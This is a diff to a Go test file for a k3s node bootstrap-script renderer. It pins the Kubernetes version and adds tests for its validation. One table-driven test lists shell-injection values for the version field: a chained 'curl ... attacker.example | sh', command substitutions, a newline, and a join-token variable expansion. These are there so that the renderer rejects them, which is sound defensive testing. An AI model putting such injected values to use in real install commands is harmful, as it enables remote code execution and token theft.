@@ -12,12 +12,15 @@ import (
 
 var update = flag.Bool("update", false, "rewrite golden files")
 
+const pinnedKubernetesVersion = "v1.35.6+k3s1"
+
 func boolPtr(b bool) *bool { return &b }
 
 func TestRenderK3sIncludesTheContract(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		Labels:              []string{"horizon.dev/pool=reserved"},
 		Taints:              []string{"example.dev/dedicated=batch:NoSchedule"},
 		InstallWatchdogUnit: boolPtr(true),
@@ -45,6 +48,7 @@ func TestRenderInstallsKubernetesByDefault(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		InstallWatchdogUnit: boolPtr(true),
 	})
 	if err != nil {
@@ -52,6 +56,88 @@ func TestRenderInstallsKubernetesByDefault(t *testing.T) {
 	}
 	if !strings.Contains(out, "get.k3s.io") {
 		t.Fatalf("expected the flavour install command, got:\n%s", out)
+	}
+}
+
+func TestRenderInstallsThePinnedKubernetesVersion(t *testing.T) {
+	out, err := Render(Options{
+		Flavor:              "k3s",
+		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
+		InstallWatchdogUnit: boolPtr(true),
+	})
+	if err != nil {
+		t.Fatalf("unexpected error %v", err)
+	}
+	want := "curl -sfL https://get.k3s.io | INSTALL_K3S_VERSION=" + pinnedKubernetesVersion + " sh -s - agent"
+	if !strings.Contains(out, want) {
+		t.Fatalf("the install command does not pin the version, want %q, got:\n%s", want, out)
+	}
+}
+
+func TestRenderRequiresAKubernetesVersionItWouldInstall(t *testing.T) {
+	out, err := Render(Options{
+		Flavor:              "k3s",
+		Server:              "https://10.20.0.10:6443",
+		InstallWatchdogUnit: boolPtr(true),
+	})
+	if err == nil {
+		t.Fatalf("an unpinned install would take whatever release is newest, got:\n%s", out)
+	}
+	if !strings.Contains(err.Error(), "--kubernetes-version") {
+		t.Errorf("error is %q, want it to name the flag", err)
+	}
+}
+
+func TestRenderRejectsAKubernetesVersionItWouldNotInstall(t *testing.T) {
+	_, err := Render(Options{
+		Flavor:              "k3s",
+		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
+		InstallKubernetes:   boolPtr(false),
+		InstallWatchdogUnit: boolPtr(true),
+	})
+	if err == nil {
+		t.Fatal("expected an error when a version is pinned and no install command is emitted")
+	}
+	for _, want := range []string{"--kubernetes-version", "--install-kubernetes"} {
+		if !strings.Contains(err.Error(), want) {
+			t.Errorf("error is %q, want it to name %s", err, want)
+		}
+	}
+}
+
+func TestRenderRejectsAKubernetesVersionTheShellCouldActOn(t *testing.T) {
+	tests := []struct {
+		name    string
+		version string
+	}{
+		{name: "a chained command", version: "v1.35.6+k3s1; curl -sfL https://attacker.example | sh"},
+		{name: "a command substitution", version: "v1.35.6+k3s1$(id)"},
+		{name: "a backquoted command", version: "v1.35.6+k3s1`id`"},
+		{name: "a line break", version: "v1.35.6+k3s1\nid"},
+		{name: "a variable expansion", version: "${HORIZON_JOIN_TOKEN}"},
+		{name: "surrounding whitespace", version: " v1.35.6+k3s1 "},
+		{name: "an upstream version without the k3s suffix", version: "v1.35.6"},
+		{name: "a channel rather than a release", version: "stable"},
+		{name: "no version at all", version: "latest"},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			out, err := Render(Options{
+				Flavor:              "k3s",
+				Server:              "https://10.20.0.10:6443",
+				KubernetesVersion:   tc.version,
+				InstallWatchdogUnit: boolPtr(true),
+			})
+			if err == nil {
+				t.Fatalf("the version reached the install command, got:\n%s", out)
+			}
+			if !strings.Contains(err.Error(), "--kubernetes-version") {
+				t.Errorf("error is %q, want it to name the flag", err)
+			}
+		})
 	}
 }
 
@@ -105,14 +191,14 @@ func TestRenderPassthroughEmitsNoFlavorContent(t *testing.T) {
 }
 
 func TestRenderQuotesPermissions(t *testing.T) {
-	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", InstallWatchdogUnit: boolPtr(true)})
+	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
 	if !strings.Contains(out, "permissions: '0600'") {
 		t.Fatal("permissions must be a quoted octal string")
 	}
 }
 
 func TestRenderOmitsWatchdogUnitWhenDisabled(t *testing.T) {
-	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", InstallWatchdogUnit: boolPtr(false)})
+	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(false)})
 	if strings.Contains(out, "systemctl enable") {
 		t.Fatal("no unit should be installed when the flag is false")
 	}
@@ -125,6 +211,7 @@ func TestRenderWritesTransientWatchdogUnitPerBoot(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:                "k3s",
 		Server:                "https://10.20.0.10:6443",
+		KubernetesVersion:     pinnedKubernetesVersion,
 		InstallWatchdogUnit:   boolPtr(true),
 		TransientWatchdogUnit: true,
 	})
@@ -169,6 +256,7 @@ func TestRenderArmsTheTransientUnitOnTheFirstBoot(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:                "k3s",
 		Server:                "https://10.20.0.10:6443",
+		KubernetesVersion:     pinnedKubernetesVersion,
 		InstallWatchdogUnit:   boolPtr(true),
 		TransientWatchdogUnit: true,
 	})
@@ -185,7 +273,7 @@ func TestRenderArmsTheTransientUnitOnTheFirstBoot(t *testing.T) {
 }
 
 func TestRenderUsesConfiguredBinaryBaseURL(t *testing.T) {
-	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", BinaryBaseURL: "https://mirror.internal/horizon", InstallWatchdogUnit: boolPtr(true)})
+	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, BinaryBaseURL: "https://mirror.internal/horizon", InstallWatchdogUnit: boolPtr(true)})
 	if !strings.Contains(out, "https://mirror.internal/horizon") {
 		t.Fatal("the configured base URL must be used")
 	}
@@ -195,7 +283,7 @@ func TestRenderUsesConfiguredBinaryBaseURL(t *testing.T) {
 }
 
 func TestRenderResolvesTheArchitectureOnTheNode(t *testing.T) {
-	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", InstallWatchdogUnit: boolPtr(true)})
+	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
 	for _, want := range []string{
 		"ARCH=$(uname -m)",
 		"x86_64) ARCH=amd64 ;;",
@@ -214,7 +302,7 @@ func TestRenderResolvesTheArchitectureOnTheNode(t *testing.T) {
 }
 
 func TestRenderProbesTheInstalledBinary(t *testing.T) {
-	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", InstallWatchdogUnit: boolPtr(true)})
+	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
 	if !strings.Contains(out, "/var/lib/horizon/bin/horizon version") {
 		t.Fatal("the install script must probe the installed binary")
 	}
@@ -224,6 +312,7 @@ func TestK3sFilesCarryExtraConfigKeys(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		FlavorConfig:        map[string]string{"node-ip": "10.0.0.5", "flannel-iface": "tailscale0"},
 		InstallWatchdogUnit: boolPtr(true),
 	})
@@ -243,6 +332,7 @@ func TestRenderRejectsExtraConfigForOwnedKeys(t *testing.T) {
 		_, err := Render(Options{
 			Flavor:              "k3s",
 			Server:              "https://10.20.0.10:6443",
+			KubernetesVersion:   pinnedKubernetesVersion,
 			FlavorConfig:        map[string]string{key: "anything"},
 			InstallWatchdogUnit: boolPtr(true),
 		})
@@ -261,6 +351,7 @@ func TestRenderRejectsFlavorConfigThatInjectsAnOwnedKey(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		FlavorConfig:        map[string]string{"flannel-iface": injectingFlavorConfigValue},
 		InstallWatchdogUnit: boolPtr(true),
 	})
@@ -291,6 +382,7 @@ func TestRenderRejectsFlavorConfigTheDocumentCannotCarry(t *testing.T) {
 			out, err := Render(Options{
 				Flavor:              "k3s",
 				Server:              "https://10.20.0.10:6443",
+				KubernetesVersion:   pinnedKubernetesVersion,
 				FlavorConfig:        tc.config,
 				InstallWatchdogUnit: boolPtr(true),
 			})
@@ -308,6 +400,7 @@ func TestRenderProducesAParsableDocument(t *testing.T) {
 	out, err := Render(Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		Labels:              []string{"horizon.dev/pool=reserved"},
 		Files:               []File{{Path: "/etc/motd", Content: "alpha: beta\n"}},
 		PostCommands:        []string{"echo done"},
@@ -374,18 +467,19 @@ func TestRenderGolden(t *testing.T) {
 	base := Options{
 		Flavor:              "k3s",
 		Server:              "https://10.20.0.10:6443",
+		KubernetesVersion:   pinnedKubernetesVersion,
 		Labels:              []string{"horizon.dev/pool=reserved"},
 		Taints:              []string{"example.dev/dedicated=batch:NoSchedule"},
 		InstallWatchdogUnit: boolPtr(true),
 	}
 	preinstalled := base
+	preinstalled.KubernetesVersion = ""
 	preinstalled.InstallKubernetes = boolPtr(false)
 	transient := base
 	transient.TransientWatchdogUnit = true
 	extraConfig := base
 	extraConfig.FlavorConfig = map[string]string{"flannel-iface": "tailscale0"}
-	prebaked := base
-	prebaked.InstallKubernetes = boolPtr(false)
+	prebaked := preinstalled
 	prebaked.TransientWatchdogUnit = true
 	prebaked.FlavorConfig = map[string]string{"flannel-iface": "tailscale0"}
 
